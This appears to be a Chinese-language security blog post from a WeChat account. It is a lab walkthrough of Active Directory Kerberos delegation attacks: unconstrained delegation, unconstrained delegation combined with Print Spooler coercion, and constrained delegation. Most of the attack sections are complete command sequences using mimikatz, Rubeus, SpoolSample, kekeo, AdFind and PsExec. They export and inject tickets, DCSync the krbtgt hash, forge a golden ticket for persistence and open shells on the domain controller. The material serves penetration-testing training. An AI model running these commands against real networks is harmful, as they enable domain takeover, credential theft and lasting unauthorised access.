#  【内网渗透】域渗透之域委派攻击

原创 Zack  [ ZackSecurity ](javascript:void\(0\);)

**ZackSecurity** ![]()

微信号 ZackSecurity

功能介绍 本公众号不定期更新Web渗透、内网渗透、红蓝攻防、代码审计、工具分享等内容。

____

___发表于_

收录于合集

1、域委派说明

域委派解释：

将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动，接受委派的用户只能是服务账户或者主机账户。

账户分类：

机器账户：计算机本身名称的账户，在域中computers组内的计算机。

主机账户：计算机系统的主机账户，用于正常用户登入计算机使用。

服务账户：计算机服务安装时创建的账户，用于运行服务时使用，不可用于登入计算机。

域委派分类：

目前域委派存在三种类型：非约束委派、约束委派、基于资源的约束委派。

非约束委派（Unconstrained delegation）：

服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT，模拟用户访问任意服务。配置了非约束委派的账户的
userAccountControl 属性有个FLAG位
WORKSTATION_TRUSTED_FOR_DELEGATION。非约束委派的设置需要SeEnableDelegation
特权，该特权通常仅授予域管理员 。

约束委派（Constrained delegation）：

由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派。对于约束性委派（Constrained
Delegation），即Kerberos的两个扩展子协议 S4u2self (Service for User to Self) 和 S4u2Proxy
(Service for User to Proxy )，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。配置了约束委派的账户的
userAccountControl 属性有个FLAG位 TRUSTED_TO_AUTH_FOR_DELEGATION，并且 msDS-
AllowedToDelegateTo 属性还会指定对哪个SPN进行委派。约束委派的设置需要SeEnableDelegation
特权，该特权通常仅授予域管理员 。约束委派与非约束委派的区别就是，约束委派在模拟用户访问服务时只能访问特定的服务。

基于资源的约束委派（Resource Based Constrained Delegation）：

为了使用户或资源更加独立，微软在Windows Server
2012中引入了基于资源的约束性委派。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派只能在运行Windows Server
2012和Windows Server 2012 R2及以上的域控制器上配置，也可以在混合模式林中应用。配置了基于资源的约束委派的账户的
userAccountControl 属性为 WORKSTATION_TRUST_ACCOUNT，并且 msDS-
AllowedToActOnBehalfOfOtherIdentity
属性的值为被允许基于资源约束性委派的账号的SID。基于资源的约束委派不需要域管理员权限去设置，而把设置属性的权限赋予给了机器自身。

域委派攻击条件：

用户的 “敏感账户，不能被委派”选项为关闭状态。

![]()

  

2、非约束委派攻击

漏洞原理：设置机械账户为非约束委派，通过域管理账户对该机械账户进行访问，留下TGT票据在该机械账户下，然后拿该票据去写入内存，从而可以利用域管理的KRBTGT票据去访问域控。

（1）非约束性委派流程

域用户通过 kerberos 身份验证访问web服务器，请求下载文件，但真正的文件在文件服务器上，于是web服务器的服务账户模拟域用户以 kerberos
协议继续认证到文件服务器。文件服务器将文件返回给web服务器，web服务器在将文件返回给域用户，这样就完成了一个委派流程。

![]()

  1. 域用户以 kerberos 身份验证访问     Web服务器，请求下载文件。

  2. Web服务是服务账户，无法请求文件，所以此服务账户向     KDC（密钥分发中心） 发起域用户的用户票据请求。

  3. KDC检查服务账户的委派属性，如果被设置，就返回域用户可转发TGT认购权证。

  4. Web服务器收到域用户的 TGT 认购权证后，使用该 TGT     向KDC申请访问文件服务器的 ST 票据。

  5. KDC     再次检查委派属性，如果申请文件服务在允许列表里，返回给服务账户 ST 票据

  6. 服务账户收到 ST 票据后，用该 ST     票据访问文件服务器，完成委派认证。

（2）非约束环境搭建

在域控设置机械账户user1允许非约束委派：

![]()

注册SPN给主机账户添加服务账户属性，给主机账户设置非约束委派账户属性。

setspn命令说明：

setspn  -L [主机用户名]

|

查询用户的SPN信息  
  
---|---  
  
setspn -U -A [SPN值] [主机用户名]

|

注册SPN属性，-U指定注册主机账户，-C指定注册机械账户  
  
setspn  -D [SPN值] [主机用户名]

|

取消SPN属性  
  
在域控将zack主机账户注册成服务账户属性：

setspn -U -A MSSQLSvc/mssql.zack.com:1433 zack

![]()

在域控将注册了SPN的主机账户（注册了SPN才能看到委派选项）允许非约束委派：

![]()

在域控主机开启winrm服务（需要本地账户管理员权限）：

winrm quickconfig

![]()

在域成员主机开启winrm服务（需要本地账户管理员权限）：

![]()

模拟委派，使委派机在被委派机留下TGT票据，这里委派机为域控，被委派机为user1：

Enter-PSSession -ComputerName user1

![]()

在任意一个域用户下都可以使用Adfind.exe工具查询域内非约束委派主机和用户。

 Adfind 使用参数：

 -b

|

指定要查询的根节点  
  
---|---  
  
 -f

|

LDAP过滤条件  
  
 attr list

|

需要显示的属性  
  
用普通域用户登入域成员主机查询zack.com域开启非约束委派主机：

AdFind.exe -b dc=zack,dc=com -f
"(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
-dn

用普通域用户登入域成员主机查询zack.com域开启非约束委派用户：

AdFind.exe -b "DC=zack,DC=com" -f
"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
cn distinguishedName

![]()

（3）非约束委派攻击

获取域成员主机的本地管理员账户权限，使用mimikatz.exe工具导出被委派时留下的TGT票据：

mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit > result.txt

![]()

看到导出了域控administrator用户的krbtgt票据，该票据可以长期保存用于权限维持和横向攻击：

![]()

如果抓不到域控administrator用户的krbtgt票据，也可以抓取其他域管理员用户的krbtgt票据：

![]()

如果没抓到票据，执行清除票据命令，等待该主机被委派后再次导出票据：

CMD执行：klist purge ，或者mimikatz工具执行

mimikatz "privilege::debug" "kerberos::purge" "exit" > result.txt

![]()

导入域控administrator用户的tgt票据，看到再次查看域控C盘时不用登入：

mimikatz.exe "kerberos::ptt
C:\Users\Administrator\Desktop\x64\\[0;2efe5b]-2-0-60a00000-Administrator@krbtgt-
ZACK.COM.kirbi" "exit" > result.txt

![]()![]()

票据导入后就拥有域控权限，使用PsExec64.exe工具调用域控cmd窗口：

PsExec64.exe\\\DC.zack.com cmd.exe

![]()



3、非约束委派+spooler打印机

（1）原理说明

该漏洞与非约束委派攻击原理一样，只不过利用常规的非约束委派攻击的话很难，因为高权限用户是不会主动去访问可控域成员主机的，所以可以利用域控或者其他服务器上面的spooler服务去主动访问可控主机，这样就可以获取访问主机的TGT票据来横向攻击。这里面会用到两个工具，分别是Rubeus和SpoolSample。

这两个工具都需要安装NetFramework4.0.30319.exe组件。

Rubeus在本地管理员运行，因为要读取系统记录日志。

SpoolSample在域用户下运行，要不然你无法使用MS-RPRN协议进行通信，实验发现域控为server2012才攻击成功。

（2）漏洞利用

在可控的域成员主机上使用本地管理员启动Rubeus.exe工具监控域控名称：

Rubeus.exe monitor /interval:1 /filteruser:DC$ > tgt.txt

![]()

切换到普通域用户登入，启动SpoolSample，输入域控名和非约束委派的机械账户名：

SpoolSample.exeDC user2

![]()

回到域成员主机的管理员账户，看到抓取到了域控主机的bash64编码TGT票据信息：

![]()

选择 编辑 \-- 替换：

![]()

在查找内容输入4个空格，点击全部替换，看到base64编码的tgt前面4个空格去掉了：

![]()![]()

执行以下powershell语句，将域控的base64编码tgt填入语句，执行成功后在当前目录下生成dc.birbi名称的主机票据：

[IO.File]::WriteAllBytes("dc.kirbi",[Convert]::FromBase64String("捕获到的base64编码"))

![]()

使用mimikatz工具将生成的域控主机tgt票据文件导入内存：

kerberos::purge

kerberos::list

kerberos::pttC:\Users\Administrator\dc.kirbi

![]()

再使用mimikatz工具将域控主机的tgt票据导出：

privilege::debug

sekurlsa::tickets /export

![]()![]()

最后再使用mimikatz工具将导出的域控主机tgt票据导入内存：

kerberos::ptt C:\Users\Administrator\tools\\[0;479a6]-2-0-60a10000-DC$@krbtgt-
ZACK.COM.kirbi

![]()

导入成功后就有了域控的TGT，就可以使用mimikatz的dcsync功能导出域控krbtgt用户的ntlm hash来制作黄金票据：

mimikatz.exe "lsadump::dcsync /domain:zack.com /user:krbtgt" "exit" >
krbtgt.txt

![]()![]()

在导出krbtgt用户资料中截取域sid和ntlm hash值，运行以下命令生成Golden.kirbi黄金票据，保存票据用于权限维持：

mimikatz.exe "kerberos::golden /domain:zack.com
/sid:S-1-5-21-2281865729-1693742006-1002177903
/krbtgt:866e2e58d93b0cc0c6161d03a72c134f /user:administrator
/ticket:Golden.kirbi" "exit" > result.txt

![]()

使用mimikatz工具清除票据，然后导入生成的黄金票据，看到可以免登入访问域控c盘：

kerberos::purge

kerberos::ptt C:\Users\Administrator\tools\Golden.kirbi

misc::cmd

![]()

使用PsExec64.exe工具调用域控cmd窗口：

PsExec64.exe \\\dc.zack.com cmd.exe

![]()



4、约束委派攻击

漏洞原理：约束委派攻击与非约束委派攻击类似，只是约束委派限制了访问的主机和服务，获取到设置了约束委派的机械账户ntlm哈希或设置了约束委派的主机账户ntlm哈希或明文密码，就可以生成tgt票据导入内存来访问约束委派设置允许访问的主机上的服务。

（1）约束性委派流程

由于非约束委派的不安全性（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软在 Windows
Server 2003 中引入了约束委派，对 Kerberos 协议进行拓展，引入了 S4U (S4U2Self / S4U2proxy),
运行服务代表用户向 KDC 请求票据。

S4U2self (Service for User to S4U2Self) ：

可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个服务账户的 userAccountControl 标志为
TRUSTED_TO_AUTH_FOR_DELEGATION，则其可以代表任何其他用户获取自身服务的 TGS/ST。

S4U2proxy(Service for User to Proxy) ：

可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以代表任何用户获取在 msDS-
AllowedToDelegateTo 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用
S4U2self 获得此 TGS/ST。

![]()

S4U2self 验证部分：

(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos
以外的其他方式验证的。

(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。

(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。

(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。

尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到
S4U2proxy 发挥作用了。

S4U2proxy 验证部分:

(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。

(6) service1 以用户的名义向 KDC 请求用户访问 service2 的 ST2。

(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给
service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。

(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。

(9) service2 响应步骤 8 的请求。

(10) service1 响应用户对步骤 5 中的请求。

（2）约束性委派环境搭建

在域控设置机械账户user2为约束委派，允许访问user1机械账户的cifs服务：

![]()

注册SPN给主机账户添加服务账户属性，给pkcn主机账户设置约束委派账户属性。

setspn命令说明：

setspn  -L [主机用户名]

|

查询用户的SPN信息  
  
---|---  
  
setspn -U -A [SPN值] [主机用户名]

|

注册SPN属性，-U指定注册主机账户，-C指定注册机械账户  
  
setspn  -D [SPN值] [主机用户名]

|

取消SPN属性  
  
在域控将zack主机账户注册成服务账户属性：

setspn -U -A MSSQLSvc/mssql.zack.com:1433 pkcn

![]()

在域控将注册了SPN的pkcn主机账户（注册了SPN才能看到委派选项）设置允许约束委派访问user1机械账户的cifs服务：

![]()

（3）约束性委派漏洞利用

如果已经获取开启约束委派主机的权限，而且拥有本地管理员权限，可以直接使用mimikatz工具导出TGT票据：

mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit" >
result.txt

![]()

如果没有导出权限或没有登录主机的权限，但是拥有机械账户的ntlm hash或者普通域用户的ntlm
hash或明文密码，就可以使用kekeo工具申请一张TGT票据：

申请TGT票据语句：

tgt::ask /user:[机械/主机账户名称] /domain:[域名称] /ntlm:[机械/主机账户hash] /ticket:[导出tgt名称]

如果是使用主机账户明文密码就把ntlm改成password即可。

kekeo.exe "tgt::ask /user:pkcn /domain:zack.com /password:123.com" "exit" >
result.txt

![]()

使用AdFind工具，输入域IP地址和域用户名与密码，查询该用户配置了哪些约束委派，看到该域用户允许委派访问user1主机的cifs服务：

AdFind.exe -h DC.zack.com -u pkcn -up 123.com -b "DC=zack,DC=com" -f
"(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn
distinguishedName msds-allowedtodelegateto

![]()

使用这张TGT票据获取pkcn域用户的TGS票据，该TGS票据可以冒充域管理administrator用户访问user1主机的cifs服务：

kekeo.exe "tgs::s4u /tgt:TGT_pkcn@ZACK.COM_krbtgt~zack.com@ZACK.COM.kirbi
/user:administrator /service:cifs/user1.zack.com" "exit" > result.txt

![]()

使用mimikatz工具将TGS票据导入内存，导入成功后看到可以免密查看user1用户的C盘：

mimikatz.exe "kerberos::ptt
TGS_administrator@ZACK.COM_cifs~user1.zack.com@ZACK.COM.kirbi" "exit" >
result.txt

![]()![]()

使用PsExec64.exe工具以域管理员的身份调用user1主机的cmd窗口：

PsExec64.exe\\\user1.zack.comcmd.exe

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

